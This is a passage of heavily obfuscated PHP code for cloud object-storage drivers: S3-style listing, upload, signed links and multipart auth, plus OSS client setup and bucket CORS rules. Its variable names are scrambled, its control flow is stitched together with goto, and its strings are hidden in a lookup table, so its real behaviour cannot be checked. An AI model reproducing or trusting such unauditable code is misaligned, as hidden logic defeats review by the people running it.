câ∑¬µ™Çæ; EΩî•ÈŒÕô: foreach ($FŒÖ àú«Â[$fÙ∞Çäô«[198]] as $b±µ•∏∆É¿) { goto C‹å’åŒ†Ã; C‹å’åŒ†Ã: $bŒŒ›ÀÆõß = $b±µ•∏∆É¿[$fÙ∞Çäô«[28]]; if ($bŒŒ›ÀÆõß == $Bµ’∞Ñ⁄ƒ—) { continue; } $c∞¬£≈…¶Á = isset($b±µ•∏∆É¿[$fÙ∞Çäô«[78]]) ? $b±µ•∏∆É¿[$fÙ∞Çäô«[78]] : 0; goto fËÌﬁ≤ÑÜ; BØ—¨¢Í˜ò: $Bã‰◊¢ä∑Ú[] = $fÍπ»Îπ»÷ ? $b±µ•∏∆É¿ : $bŒŒ›ÀÆõß; goto CôÿÉ∑…œ◊; fËÌﬁ≤ÑÜ: $càñ≤áã∑è = $c∞¬£≈…¶Á == 0 && substr($bŒŒ›ÀÆõß, strlen($bŒŒ›ÀÆõß) - 1, 1) == $fÙ∞Çäô«[8] ? !0 : !1; if ($e»œ¯ôç¯á) { $this->cacheMethod($fÙ∞Çäô«[199], $bŒŒ›ÀÆõß, $càñ≤áã∑è); $this->cacheMethod($fÙ∞Çäô«[200], $bŒŒ›ÀÆõß, $b±µ•∏∆É¿); } if ($càñ≤áã∑è) { $aœéóÓ·óˆ[] = $bŒŒ›ÀÆõß; continue; } goto BØ—¨¢Í˜ò; CôÿÉ∑…œ◊: } foreach ($FŒÖ àú«Â[$fÙ∞Çäô«[201]] as $b±µ•∏∆É¿) { $aœéóÓ·óˆ[] = $b±µ•∏∆É¿[$fÙ∞Çäô«[28]]; if ($e»œ¯ôç¯á) { $this->cacheMethod($fÙ∞Çäô«[199], $b±µ•∏∆É¿[$fÙ∞Çäô«[28]], !0); } } if ($e»œ¯ôç¯á) { $this->cacheMethod($fÙ∞Çäô«[199], $f¨Ï€ïí„ù, !0); } goto eÛ˘«ŸÓÖ¶; Aøæ”œÓÖ„: } private function listObjs($Fö¡Ñà‰áÔ, $dˆ‘∑†ÈÍé = null, $E„π‘Ü∫§— = null, $eäå¯¨ı∂ù = null) { $e›Ç≤’à¬≥ =& $_SERVER[’ÿƒ†ïò]; $Fö¡Ñà‰áÔ = trim($Fö¡Ñà‰áÔ, $e›Ç≤’à¬≥[8]); $bôª§û˘˘˘ = empty($Fö¡Ñà‰áÔ) && $Fö¡Ñà‰áÔ !== $e›Ç≤’à¬≥[191] ? $e›Ç≤’à¬≥[33] : $Fö¡Ñà‰áÔ . $e›Ç≤’à¬≥[8]; return $this->client->getBucket($this->bucket, $bôª§û˘˘˘, $dˆ‘∑†ÈÍé, $E„π‘Ü∫§—, $eäå¯¨ı∂ù, !0); } public function has($B¶Ú±Ï¡Ü, $e€Üœ†ß‚´ = false, $Aæ”ÖΩèÌ© = true) { goto f™›‹∫Í∏ß; aêΩúè≠≤Û: $BÕÃ‰¥∏ò‰ = null; $a¬Ÿ†™ò¶â = 500; $Dëô‡–ßË– = $c•ÀãìÖèé[8]; goto c‰á¡ıå‰; c‰á¡ıå‰: $eüí´Ñ¯≤ø = $C∏âö€π‰¯ = array(); while (!0) { $B∞—ı‰µÉ‹ = $this->listObjs($B¶Ú±Ï¡Ü, $BÕÃ‰¥∏ò‰, $a¬Ÿ†™ò¶â, $Dëô‡–ßË–); if (!$B∞—ı‰µÉ‹) { break; } $BÕÃ‰¥∏ò‰ = $B∞—ı‰µÉ‹[$c•ÀãìÖèé[202]]; $cÕúÍŸ±ƒÖ = $B∞—ı‰µÉ‹[$c•ÀãìÖèé[198]]; $DèÇßå°’á = $B∞—ı‰µÉ‹[$c•ÀãìÖèé[201]]; if (empty($cÕúÍŸ±ƒÖ) && empty($DèÇßå°’á)) { break; } if (count($cÕúÍŸ±ƒÖ) == 1 && $cÕúÍŸ±ƒÖ[0][$c•ÀãìÖèé[28]] == $dı≠º“„…—) { break; } if ($e€Üœ†ß‚´) { if (count($cÕúÍŸ±ƒÖ)) { $cÕúÍŸ±ƒÖ = array_column($cÕúÍŸ±ƒÖ, $c•ÀãìÖèé[28]); $eüí´Ñ¯≤ø = array_merge($eüí´Ñ¯≤ø, $cÕúÍŸ±ƒÖ); } if (count($DèÇßå°’á)) { $DèÇßå°’á = array_column($DèÇßå°’á, $c•ÀãìÖèé[28]); $C∏âö€π‰¯ = array_merge($C∏âö€π‰¯, $DèÇßå°’á); } if ($BÕÃ‰¥∏ò‰ === null) { break; } continue; } if ($Aæ”ÖΩèÌ©) { if (!empty($cÕúÍŸ±ƒÖ)) { if (count($cÕúÍŸ±ƒÖ) > 1 || isset($cÕúÍŸ±ƒÖ[0][$c•ÀãìÖèé[28]]) && $cÕúÍŸ±ƒÖ[0][$c•ÀãìÖèé[28]] != $dı≠º“„…—) { return !0; } } } else { if (!empty($DèÇßå°’á)) { return !0; } } if ($BÕÃ‰¥∏ò‰ === null) { break; } } if ($e€Üœ†ß‚´) { $eüí´Ñ¯≤ø = array_diff($eüí´Ñ¯≤ø, array($dı≠º“„…—)); $eüí´Ñ¯≤ø = count(array_unique($eüí´Ñ¯≤ø)); $C∏âö€π‰¯ = count(array_unique($C∏âö€π‰¯)); return array($c•ÀãìÖèé[203] => $eüí´Ñ¯≤ø, $c•ÀãìÖèé[204] => $C∏âö€π‰¯); } goto B€°°∏ëÈÛ; f™›‹∫Í∏ß: $c•ÀãìÖèé =& $_SERVER[’ÿƒ†ïò]; $B¶Ú±Ï¡Ü = trim($B¶Ú±Ï¡Ü, $c•ÀãìÖèé[8]); $dı≠º“„…— = empty($B¶Ú±Ï¡Ü) && $B¶Ú±Ï¡Ü !== $c•ÀãìÖèé[191] ? $c•ÀãìÖèé[33] : $B¶Ú±Ï¡Ü . $c•ÀãìÖèé[8]; goto aêΩúè≠≤Û; B€°°∏ëÈÛ: return !1; goto Eƒ‹œÛÌ¿Ü; Eƒ‹œÛÌ¿Ü: } public function listAll($b–ìõõï◊ ) { $d≤áà°ü◊« =& $_SERVER[’ÿƒ†ïò]; $aû’±ÃÑÀÚ = $this->fileList($b–ìõõï◊ , $d≤áà°ü◊«[33], !0); $E„Ã£“†õÜ = array(); foreach ($aû’±ÃÑÀÚ[$d≤áà°ü◊«[74]] as $bëòÚäøæŒ) { $E„Ã£“†õÜ[$bëòÚäøæŒ[$d≤áà°ü◊«[28]]] = $bëòÚäøæŒ[$d≤áà°ü◊«[78]]; } foreach ($aû’±ÃÑÀÚ[$d≤áà°ü◊«[75]] as $bëòÚäøæŒ) { if (is_string($bëòÚäøæŒ)) { $E„Ã£“†õÜ[$bëòÚäøæŒ] = 0; } } return $this->listAllFiles($b–ìõõï◊ , array_keys($E„Ã£“†õÜ), $E„Ã£“†õÜ); } public function canRead($f„à¡îû»ï) { $a√§éºÊ—≠ =& $_SERVER[’ÿƒ†ïò]; $CØÛóÒôı• = $this->client->getAccessControlPolicy($this->bucket, $f„à¡îû»ï); if (!$CØÛóÒôı•) { return !1; } return in_array($CØÛóÒôı•, array($a√§éºÊ—≠[205], $a√§éºÊ—≠[206], $a√§éºÊ—≠[207])) ? !0 : !1; } public function canWrite($a§ ¨˜É…›) { $dåÁî´âáƒ =& $_SERVER[’ÿƒ†ïò]; $FÒ¶èêª›˜ = $this->client->getAccessControlPolicy($this->bucket, $a§ ¨˜É…›); if (!$FÒ¶èêª›˜) { return !1; } return in_array($FÒ¶èêª›˜, array($dåÁî´âáƒ[205], $dåÁî´âáƒ[206])) ? !0 : !1; } public function getContent($B€˜èß◊Ü“) { return $this->client->getObject($this->bucket, $B€˜èß◊Ü“); } public function setContent($cÀ˘éº–˘…, $cÀﬂ«ì¨Ã“ = '', $B££ãí˜Ó« = false) { goto dÀºò∞£ºÊ; dÀºò∞£ºÊ: $CÃ∂øﬂ∆≠æ =& $_SERVER[’ÿƒ†ïò]; $cÀ˘éº–˘… = $B££ãí˜Ó« ? trim($cÀ˘éº–˘…, $CÃ∂øﬂ∆≠æ[8]) . $CÃ∂øﬂ∆≠æ[8] : $cÀ˘éº–˘…; $CÑÎﬂû®›– = get_file_mime(get_path_ext($cÀ˘éº–˘…)); goto fÑäŒëÓµÏ; f¡∑¯íŒ¯±: $this->cacheMethod(null, null); $bÆÈ´Úï¥˜ = $this->copyFile($cÀ˘éº–˘…, $cÀ˘éº–˘…, array($CÃ∂øﬂ∆≠æ[208] => $bÆÈ´Úï¥˜[$CÃ∂øﬂ∆≠æ[209]])); return $bÆÈ´Úï¥˜ ? !0 : !1; goto AáÉ´µœò„; fÑäŒëÓµÏ: $bÆÈ´Úï¥˜ = $this->client->putObject($cÀﬂ«ì¨Ã“, $this->bucket, $cÀ˘éº–˘…, $CÃ∂øﬂ∆≠æ[192], array(), $CÑÎﬂû®›–); if (!$bÆÈ´Úï¥˜) { return !1; } if ($B££ãí˜Ó«) { return !0; } goto f¡∑¯íŒ¯±; AáÉ´µœò„: } public function fileSubstr($a”⁄·Ò∏√ã, $FÜåﬁ¥º√“, $C⁄¥π¬¬•›) { $dáé∞‡˜∞ﬂ = $FÜåﬁ¥º√“ + $C⁄¥π¬¬•› - 1; return $this->client->getObject($this->bucket, $a”⁄·Ò∏√ã, array($_SERVER[’ÿƒ†ïò][210] => "\x62\171\x74\145\x73\x3d{$FÜåﬁ¥º√“}\55{$dáé∞‡˜∞ﬂ}")); } public function upload($Dæ€π¢È®Ì, $a≈ÿÛ≤Û·Ñ, $bÒ∆æƒÊÂã = false, $B©¿ô≈©ëí = REPEAT_REPLACE) { $eØã©Û£ÔÌ =& $_SERVER[’ÿƒ†ïò]; $cƒËÖ„¡öÍ = array($eØã©Û£ÔÌ[208] => @md5_file($a≈ÿÛ≤Û·Ñ)); $DÃÛû©À∏∂ = array($eØã©Û£ÔÌ[211] => get_file_mime(get_path_ext($Dæ€π¢È®Ì))); if (IO::size($a≈ÿÛ≤Û·Ñ) <= 1024 * 1024 * 200) { $A€Û©îâ∫ = $this->client->putObjectFile($a≈ÿÛ≤Û·Ñ, $this->bucket, $Dæ€π¢È®Ì, $eØã©Û£ÔÌ[192], $cƒËÖ„¡öÍ, $DÃÛû©À∏∂); return !empty($A€Û©îâ∫) ? $this->getPathOuter($Dæ€π¢È®Ì) : !1; } $b“È…ˆóºá = $this->client->multiUploadObject($a≈ÿÛ≤Û·Ñ, $this->bucket, trim($Dæ€π¢È®Ì, $eØã©Û£ÔÌ[8]), $cƒËÖ„¡öÍ, $DÃÛû©À∏∂); return $b“È…ˆóºá ? $this->getPathOuter($Dæ€π¢È®Ì) : !1; } public function download($C´ÙîÚûèÊ, $BÈòé¡Í§µ) { if (!@is_dir($this->pathFather($BÈòé¡Í§µ)) && !IO::mkdir($this->pathFather($BÈòé¡Í§µ))) { return !1; } $DèÀÑÑ±≤û = $this->client->getObject($this->bucket, $C´ÙîÚûèÊ, array(), $BÈòé¡Í§µ); return $DèÀÑÑ±≤û !== !1 ? $BÈòé¡Í§µ : !1; } public function link($B©†»–çá°, $dçóê™µƒã = array()) { $béˆËüßñã =& $_SERVER[’ÿƒ†ïò]; if ($this->signVer == $béˆËüßñã[212]) { return $this->client->getAuthenticatedURL($this->bucket, $B©†»–çá°, 3600 * 12, $dçóê™µƒã); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($B©†»–çá°, $béˆËüßñã[8]), 3600 * 12, $this->region, array(), !0, $dçóê™µƒã); } public function fileOut($c·âêá›éû, $DëÛ‘Ωºøè = false, $dÒøö±∞÷◊ = false, $A£ºµ¶õƒÁ = '') { goto dããÿÖßƒã; cëÚå¿¬Ê©: $d≈Ö‚Ôù®È = array($F⁄±’Ç¥∂ä[216] => $DëÛ‘Ωºøè . $F⁄±’Ç¥∂ä[217] . rawurlencode($dÒøö±∞÷◊), $F⁄±’Ç¥∂ä[218] => $D¨ÁÀÚËÇÌ); $CúõêÁﬁˆƒ = $this->link($c·âêá›éû, $d≈Ö‚Ôù®È); $this->fileOutLink($CúõêÁﬁˆƒ); goto fãÓÌàùÂ™; c¨ÊÊ¨Ñﬂ©: $D¨ÁÀÚËÇÌ = get_file_mime(get_path_ext($dÒøö±∞÷◊)); if ($D¨ÁÀÚËÇÌ == $F⁄±’Ç¥∂ä[213]) { return parent::fileOut($c·âêá›éû, $DëÛ‘Ωºøè, $dÒøö±∞÷◊, $A£ºµ¶õƒÁ); } $DëÛ‘Ωºøè = $DëÛ‘Ωºøè ? $F⁄±’Ç¥∂ä[214] : $F⁄±’Ç¥∂ä[215]; goto cëÚå¿¬Ê©; dããÿÖßƒã: $F⁄±’Ç¥∂ä =& $_SERVER[’ÿƒ†ïò]; if ($this->isFileOutServer()) { return $this->fileOutServer($c·âêá›éû, $DëÛ‘Ωºøè, $dÒøö±∞÷◊, $A£ºµ¶õƒÁ); } if (!$dÒøö±∞÷◊) { $dÒøö±∞÷◊ = $this->pathThis($c·âêá›éû); } goto c¨ÊÊ¨Ñﬂ©; fãÓÌàùÂ™: } public function fileOutServer($fêí≥ÒÖùû, $a•ãÆçÖßã = false, $cøŸâ÷Üﬂ  = false, $eÎ…‰ú®ﬂè = '') { parent::fileOut($fêí≥ÒÖùû, $a•ãÆçÖßã, $cøŸâ÷Üﬂ , $eÎ…‰ú®ﬂè); } public function fileOutImageServer($dÆŸﬁç”©ß, $e—‹ÜãÎúõ = 250) { parent::fileOutImage($dÆŸﬁç”©ß, $e—‹ÜãÎúõ); } public function hashMd5($Bπı àåÙ◊, $AœÙ¡’ùˆá = '') { $c†ƒÂª∆∏≥ =& $_SERVER[’ÿƒ†ïò]; $CàÌ≈©å…Û = $this->objectMeta($Bπı àåÙ◊); if (!$CàÌ≈©å…Û) { return !1; } $AœÙ¡’ùˆá = $AœÙ¡’ùˆá ? $AœÙ¡’ùˆá : _get($CàÌ≈©å…Û, $c†ƒÂª∆∏≥[219]); $AœÙ¡’ùˆá = $AœÙ¡’ùˆá ? $AœÙ¡’ùˆá : _get($CàÌ≈©å…Û, $c†ƒÂª∆∏≥[209], $c†ƒÂª∆∏≥[33]); return $AœÙ¡’ùˆá; } public function uploadFormData($aÊÊèÖåŒÌ, $Fõ…‘ºÒıù = 3600) { $AÊÍ≤âäí† =& $_SERVER[’ÿƒ†ïò]; $FÆòä˘ñäÊ = $this->pathFather($aÊÊèÖåŒÌ); $a÷®ü¶º‘Ï = $this->client->getHttpUploadPostParams($this->bucket, $FÆòä˘ñäÊ, $AÊÍ≤âäí†[192], $Fõ…‘ºÒıù); return array_merge((array) $a÷®ü¶º‘Ï, array($AÊÍ≤âäí†[175] => $this->getHost())); } public function multiUploadFormData($AØˆ¥è–ÀÈ, $EßØ“‰ÉóÚ = 3600) { $E«ªíÍ´À„ =& $_SERVER[’ÿƒ†ïò]; $D»ë†≤∏øÓ = gmdate($E«ªíÍ´À„[220]); $FËå·ÍÈëï = array(); $Fïç±ÑÏæ° = $this->client->getUploadId($this->bucket, $AØˆ¥è–ÀÈ, $FËå·ÍÈëï); if (!$Fïç±ÑÏæ°) { return !1; } return array($E«ªíÍ´À„[221] => $Fïç±ÑÏæ°, $E«ªíÍ´À„[175] => $this->getHost() . $E«ªíÍ´À„[8] . $this->pathEncode($AØˆ¥è–ÀÈ), $E«ªíÍ´À„[222] => $D»ë†≤∏øÓ, $E«ªíÍ´À„[93] => $AØˆ¥è–ÀÈ); } public function multiUploadAuthData($C§ÖÀπêîˆ, $E◊•ê◊À” = array()) { goto D˜“ﬁ◊◊¡ù; D˜“ﬁ◊◊¡ù: $FÙãäΩ‡ëƒ =& $_SERVER[’ÿƒ†ïò]; $dö’ŒÒ†¬Î = isset($E◊•ê◊À”[$FÙãäΩ‡ëƒ[222]]) ? $E◊•ê◊À”[$FÙãäΩ‡ëƒ[222]] : gmdate($FÙãäΩ‡ëƒ[220]); $D‰œß—œé‰ = isset($E◊•ê◊À”[$FÙãäΩ‡ëƒ[168]]) ? $E◊•ê◊À”[$FÙãäΩ‡ëƒ[168]] : $FÙãäΩ‡ëƒ[33]; goto Bﬁöﬁ≈Ÿ«µ; eõ∞õ÷áæá: $f§ÑõÜû˘à = implode($FÙãäΩ‡ëƒ[229], $fûéﬂ¡êÖÔ); $C≠ËÔ§áÜ˘ = base64_encode(hash_hmac($FÙãäΩ‡ëƒ[230], $f§ÑõÜû˘à, $this->secret, !0)); $A´Ó§⁄„£∑ = $FÙãäΩ‡ëƒ[231] . $this->accessKey . $FÙãäΩ‡ëƒ[4] . $C≠ËÔ§áÜ˘; goto B¡Âóÿ®Îû; Bﬁöﬁ≈Ÿ«µ: $c£ﬁù£±≈á = $E◊•ê◊À”[$FÙãäΩ‡ëƒ[93]]; unset($E◊•ê◊À”[$FÙãäΩ‡ëƒ[93]]); if (isset($E◊•ê◊À”[$FÙãäΩ‡ëƒ[223]])) { $E◊•ê◊À”[$FÙãäΩ‡ëƒ[222]] = $dö’ŒÒ†¬Î; return $this->listUploadParts($c£ﬁù£±≈á, $E◊•ê◊À”); } goto f≠≈Ç∫–Ìﬂ; B¡Âóÿ®Îû: if (strpos($D‰œß—œé‰, $FÙãäΩ‡ëƒ[225]) === 0) { return array($FÙãäΩ‡ëƒ[232] => $A´Ó§⁄„£∑, $FÙãäΩ‡ëƒ[222] => $dö’ŒÒ†¬Î); } return $A´Ó§⁄„£∑; goto dﬁëÛ®îø—; f≠≈Ç∫–Ìﬂ: $fûéﬂ¡êÖÔ = array($FÙãäΩ‡ëƒ[224], $FÙãäΩ‡ëƒ[33], $FÙãäΩ‡ëƒ[119], $FÙãäΩ‡ëƒ[33], "\x78\55\141\155\x7a\55\144\x61\164\145\72{$dö’ŒÒ†¬Î}", $FÙãäΩ‡ëƒ[8] . $this->bucket . $FÙãäΩ‡ëƒ[8] . $this->pathEncode($c£ﬁù£±≈á) . $D‰œß—œé‰); if (strpos($D‰œß—œé‰, $FÙãäΩ‡ëƒ[225]) === 0) { $fûéﬂ¡êÖÔ[0] = $FÙãäΩ‡ëƒ[226]; } if (isset($E◊•ê◊À”[$FÙãäΩ‡ëƒ[227]]) && $E◊•ê◊À”[$FÙãäΩ‡ëƒ[227]] == $FÙãäΩ‡ëƒ[228]) { $fûéﬂ¡êÖÔ[0] = $FÙãäΩ‡ëƒ[228]; } goto eõ∞õ÷áæá; dﬁëÛ®îø—: } public function listUploadParts($E©£°é∂ÚÈ, $f¶ù∂ôœŸÁ = array()) { goto e›ïÉ¨Ø‡π; bæö±§ïåˆ: $C¬î⁄ÖÁîŒ = $this->multiUploadAuthData($E©£°é∂ÚÈ, $f¶ù∂ôœŸÁ); if (empty($C¬î⁄ÖÁîŒ)) { return !1; } return array($bÈ† äëÕ˜[232] => $C¬î⁄ÖÁîŒ, $bÈ† äëÕ˜[222] => $f¶ù∂ôœŸÁ[$bÈ† äëÕ˜[222]], $bÈ† äëÕ˜[234] => $B∂„¨Ÿø“ê); goto dÊÁ∆õ∆ò‡; e›ïÉ¨Ø‡π: $bÈ† äëÕ˜ =& $_SERVER[’ÿƒ†ïò]; $Bè·•ö∫·• = str_replace($bÈ† äëÕ˜[233], $bÈ† äëÕ˜[33], $f¶ù∂ôœŸÁ[$bÈ† äëÕ˜[168]]); $B∂„¨Ÿø“ê = $this->client->listParts($this->bucket, $E©£°é∂ÚÈ, $Bè·•ö∫·•); goto eãàë«“•ù; eãàë«“•ù: if (!$B∂„¨Ÿø“ê) { return !1; } unset($f¶ù∂ôœŸÁ[$bÈ† äëÕ˜[223]], $f¶ù∂ôœŸÁ[$bÈ† äëÕ˜[227]]); $f¶ù∂ôœŸÁ[$bÈ† äëÕ˜[93]] = $E©£°é∂ÚÈ; goto bæö±§ïåˆ; dÊÁ∆õ∆ò‡: } public function getHost() { return parent::getHost() . $_SERVER[’ÿƒ†ïò][8] . $this->bucket; } public function size($e‚ÁÇßõÂ) { $Cæôâ±ê¡ = $this->objectMeta($e‚ÁÇßõÂ); return $Cæôâ±ê¡ ? $Cæôâ±ê¡[$_SERVER[’ÿƒ†ïò][78]] : 0; } public function info($C Ç∑∞üçá) { if ($this->isFolder($C Ç∑∞üçá)) { return $this->folderInfo($C Ç∑∞üçá); } else { if ($this->isFile($C Ç∑∞üçá)) { return $this->fileInfo($C Ç∑∞üçá); } } return !1; } public function exist($FÙµèé˜ﬁŒ) { return $this->isFile($FÙµèé˜ﬁŒ) || $this->isFolder($FÙµèé˜ﬁŒ); } public function isFile($dü€õÈÃ¥™) { return !$this->isFolder($dü€õÈÃ¥™) && $this->objectMeta($dü€õÈÃ¥™); } public function isFolder($dÎÊáÆëÖÂ) { return $this->cacheMethod($_SERVER[’ÿƒ†ïò][199], $dÎÊáÆëÖÂ); } protected function objectMeta($fò≥‘‹∆ﬂ⁄) { return $this->cacheMethod($_SERVER[’ÿƒ†ïò][200], $fò≥‘‹∆ﬂ⁄); } protected function _objectMeta($B‘û≈üßŸæ) { $e“ÔŒÉ¨ëè =& $_SERVER[’ÿƒ†ïò]; $B‘û≈üßŸæ = rtrim($B‘û≈üßŸæ, $e“ÔŒÉ¨ëè[8]); try { $CÖ≈™£ªº¢ = $this->client->getObjectInfo($this->bucket, $B‘û≈üßŸæ); if (!isset($CÖ≈™£ªº¢[$e“ÔŒÉ¨ëè[219]]) && isset($CÖ≈™£ªº¢[$e“ÔŒÉ¨ëè[235]])) { $CÖ≈™£ªº¢[$e“ÔŒÉ¨ëè[219]] = $CÖ≈™£ªº¢[$e“ÔŒÉ¨ëè[235]]; } } catch (Exception $f»≠â¿Á∫’) { $CÖ≈™£ªº¢ = !1; } if (!$CÖ≈™£ªº¢) { } return $CÖ≈™£ªº¢; } protected function _isFolder($Aì¡…√‘ÇÎ) { goto FÎ¶±¶àøÜ; FÎ¶±¶àøÜ: $cƒë≈Ø“©Ü =& $_SERVER[’ÿƒ†ïò]; $Aì¡…√‘ÇÎ = rtrim($Aì¡…√‘ÇÎ, $cƒë≈Ø“©Ü[8]); if ($Aì¡…√‘ÇÎ == $cƒë≈Ø“©Ü[33] || $Aì¡…√‘ÇÎ == $cƒë≈Ø“©Ü[8]) { return !0; } goto bï¿”èÛÊ∞; d·´Éã“ÖØ: return stripos($f»’®®ö˘Ê, $Aì¡…√‘ÇÎ . $cƒë≈Ø“©Ü[8]) === 0 ? !0 : !1; if (substr($f»’®®ö˘Ê, -1) == $cƒë≈Ø“©Ü[8]) { return !0; } if (get_path_this($f»’®®ö˘Ê) == get_path_this($Aì¡…√‘ÇÎ)) { return !1; } goto f«Ω˘ÑÁ»∆; bï¿”èÛÊ∞: $cœ∆¿Œ¬ÌÀ = $this->client->getBucket($this->bucket, $Aì¡…√‘ÇÎ, null, 1); if (empty($cœ∆¿Œ¬ÌÀ[$cƒë≈Ø“©Ü[198]])) { return !1; } $f»’®®ö˘Ê = $cœ∆¿Œ¬ÌÀ[$cƒë≈Ø“©Ü[198]][0][$cƒë≈Ø“©Ü[28]]; goto d·´Éã“ÖØ; f«Ω˘ÑÁ»∆: return !0; goto eå¯ˆöº•’; eå¯ˆöº•’: } } define($_SERVER[’ÿƒ†ïò][236], 1); goto bç∆À∏º±ü; d´Ó˘ß…ò«: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($eÖ™Êé≥…¢) { parent::__construct($eÖ™Êé≥…¢); $this->signatureVersion($_SERVER[’ÿƒ†ïò][212]); } public function fileOutLink($cÚÑï£ùçß) { $f¢∏¿»Üµ± =& $_SERVER[’ÿƒ†ïò]; if (substr($cÚÑï£ùçß, 0, 7) == $f¢∏¿»Üµ±[1232]) { $cÚÑï£ùçß = $f¢∏¿»Üµ±[1233] . substr($cÚÑï£ùçß, 7); } header($f¢∏¿»Üµ±[159] . $cÚÑï£ùçß); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($eåÛ©ìä◊) { parent::__construct(); include_once SDK_DIR . $_SERVER[’ÿƒ†ïò][1288]; $this->_init($eåÛ©ìä◊); } public function _init($c•÷Óìáˆ™) { $DÔÀã¬…ì« =& $_SERVER[’ÿƒ†ïò]; foreach ($c•÷Óìáˆ™ as $b∫›ÇÇúœö => $A≈Ÿ©·Òƒ) { if (isset($this->{$b∫›ÇÇúœö})) { $this->{$b∫›ÇÇúœö} = $A≈Ÿ©·Òƒ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($DÔÀã¬…ì«[1289] . LNG($DÔÀã¬…ì«[1290])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto FÒ¶ë˜„ÆÆ; a•€“ããë≠: $Bº§Ã´Ê»->setMaxAgeSeconds(600); $Bº§Ã´Ê»->addExposeHeader($a…Áìûó¯–[1296]); $Bº§Ã´Ê»->addAllowedHeader($a…Áìûó¯–[1291]); goto D“µÓßÍúÑ; Dãø¨˜á¢á: $Bº§Ã´Ê»->addAllowedOrigin($a…Áìûó¯–[1291]); $Bº§Ã´Ê»->addAllowedMethod($a…Áìûó¯–[1292]); $Bº§Ã´Ê»->addAllowedMethod($a…Áìûó¯–[1293]); goto DØª∫àﬂ•; FÒ¶ë˜„ÆÆ: $a…Áìûó¯– =& $_SERVER[’ÿƒ†ïò]; $dÖ«∞ÂÿÏı = new OSS\Model\CorsConfig(); $Bº§Ã´Ê» = new OSS\Model\CorsRule(); goto Dãø¨˜á¢á; D“µÓßÍúÑ: $dÖ«∞ÂÿÏı->addRule($Bº§Ã´Ê»); try { $this->client->putBucketCors($this->bucket, $dÖ«∞ÂÿÏı); } catch (OSS\Core\OssException $Eâ –Û√èÜ) { return !1; } return !0; goto A©î’Ê§˘Ì; DØª∫àﬂ•: $Bº§Ã´Ê»->addAllowedMethod($a…Áìûó¯–[1294]); $Bº§Ã´Ê»->addAllowedMethod($a…Áìûó¯–[1295]); $Bº§Ã´Ê»->addAllowedMethod($a…Áìûó¯–[158]); goto a•€“ããë≠; A©î’Ê§˘Ì: } public function getBucketCors() { goto DÑ±±ã¶áÚ; C≠â≠∂ Â¢: $EäÀ≈ÜÀØÇ = $d·Ì¨πê”™[0]->getMaxAgeSeconds(); $f›´äö“ò‚ = $d·Ì¨πê”™[0]->getExposeHeaders(); $dãü∫¨ÌÇ‚ = $d·Ì¨πê”™[0]->getAllowedHeaders(); goto bÔÑÁ“ñ‘Ï; Fí∞≥¨ö¨Ó: if (!$fŸﬁΩÛùﬁ“ || !($d·Ì¨πê”™ = $fŸﬁΩÛùﬁ“->getRules())) { return null; } $DèÛß©Á  = $d·Ì¨πê”™[0]->getAllowedOrigins(); $CÎèöﬂ≈Îù = $d·Ì¨πê”™[0]->getAllowedMethods(); goto C≠â≠∂ Â¢; bÔÑÁ“ñ‘Ï: return array($Aî´π±Ñùë[181] => isset($DèÛß©Á [0]) ? $DèÛß©Á [0] : $Aî´π±Ñùë[33], $Aî´π±Ñùë[185] => $CÎèöﬂ≈Îù, $Aî´π±Ñùë[1297] => $EäÀ≈ÜÀØÇ, $Aî´π±Ñùë[1298] => isset($f›´äö“ò‚[0]) ? $f›´äö“ò‚[0] : $Aî´π±Ñùë[33], $Aî´π±Ñùë[183] => isset($dãü∫¨ÌÇ‚[0]) ? $dãü∫¨ÌÇ‚[0] : $Aî´π±Ñùë[33]); goto Aï‹Öî¥Ê; DÑ±±ã¶áÚ: $Aî´π±Ñùë =& $_SERVER[’ÿƒ†ïò]; $fŸﬁΩÛùﬁ“ = null; try { $fŸﬁΩÛùﬁ“ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $fœåãœ»îã) { return null; } goto Fí∞≥¨ö¨Ó; Aï‹Öî¥Ê: } public function isBucketCors() { goto cÁ…ÍûÇœ“; a√®Âòˆ±è: $fâèÙÚÑ¡Ç = array($fåˆùªÊ∆…[186], $fåˆùªÊ∆…[187], $fåˆùªÊ∆…[188], $fåˆùªÊ∆…[189], $fåˆùªÊ∆…[190]); $d¶êöèÛùã = array_diff($fâèÙÚÑ¡Ç, $D´ˆê∂≈ÀÁ); return empty($d¶êöèÛùã); goto aò≥–ï·ê≈; cÁ…ÍûÇœ“: $fåˆùªÊ∆… =& $_SERVER[’ÿƒ†ïò]; $Dø»¶∏ãüà = $this->getBucketCors(); if (!$Dø»¶∏ãüà || !is_array($Dø»¶∏ãüà)) { return !1; } goto eú†¶…‡ÚÀ; eú†¶…‡ÚÀ: if ($Dø»¶∏ãüà[$fåˆùªÊ∆…[181]] != $fåˆùªÊ∆…[182] || $Dø»¶∏ãüà[$fåˆùªÊ∆…[183]] != $fåˆùªÊ∆…[182]) { return !1; } $D´ˆê∂≈ÀÁ = array_map($fåˆùªÊ∆…[184], $Dø»¶∏ãüà[$fåˆùªÊ∆…[185]]); if (!is_array($D´ˆê∂≈ÀÁ)) { $D´ˆê∂≈ÀÁ = array(); } goto a√®Âòˆ±è; aò≥–ï·ê≈: } public function mkfile($FàΩìåÊﬁ‹, $bùÜΩÚ∏Ÿè = '', $fÒâˆæ‹ÃË = REPEAT_RENAME) { $D£ŒÜ÷Ø„È = $this->setContent($FàΩìåÊﬁ‹, $bùÜΩÚ∏Ÿè); if ($D£ŒÜ÷Ø„È !== !1) { return $this->getPathOuter($FàΩìåÊﬁ‹); } return !1; } public function mkdir($EπÆçøœÖ, $A√¢õÖ‹™¥ = REPEAT_SKIP) { if ($this->_isFolder($EπÆçøœÖ)) { return $this->getPathOuter($EπÆçøœÖ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($EπÆçøœÖ)); } catch (OSS\Core\OssException $F·¥ŸÉÓÚ) { return !1; } return $this->getPathOuter($EπÆçøœÖ); } private function fileList($a”òÓ∆ôæ∑, 